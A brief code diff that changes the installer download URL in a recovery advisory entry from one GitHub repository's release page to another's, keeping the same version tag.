@@ -13,7 +13,7 @@ const recovery = {
   action: {
     label: "Download installer",
     kind: "open-url",
-    url: "https://github.com/oblien/openship/releases/tag/v9.8.7",
+    url: "https://github.com/Nextrium/kovalio/releases/tag/v9.8.7",
   },
 };
 const manifest = { advisories: [recovery] };
